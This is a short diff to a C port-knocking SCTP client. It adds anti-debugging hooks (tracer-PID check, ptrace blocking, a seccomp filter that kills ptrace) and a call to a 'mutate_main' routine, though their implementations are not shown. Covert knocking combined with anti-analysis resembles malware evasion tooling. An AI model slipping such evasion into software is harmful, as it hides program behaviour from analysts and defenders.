@@ -8,10 +8,17 @@
 #include <sys/socket.h>
 #include <errno.h>
 #include <signal.h>
+#include "anti_debug.h"
 
 #define KNOCK_PORT 12345
 #define SCTP_PORT 5000
 #define BUFSIZE 4096
+
+extern void anti_debug();        		
+extern void check_tracer_pid(void);
+extern void block_ptrace_attaches(void);
+extern void install_seccomp_ptrace_kill(void);
+extern int mutate_main(int argc, char **argv);
 
 #define SEQ_LEN 3
 const char *KNOCK_SEQUENCE[SEQ_LEN] = {
@@ -86,6 +93,7 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
+    anti_debug();
     send_knock_sequence_sctp(argv[1]);
 
     // Connect to the real SCTP service
@@ -146,7 +154,9 @@ int main(int argc, char *argv[]) {
 
             write(STDOUT_FILENO, buffer, n);
         }
-
+	int fake_argc = 1;
+        char *fake_argv[] = { "program_name", NULL };
+        mutate_main(fake_argc, fake_argv);
         printf("\n");
     }
 
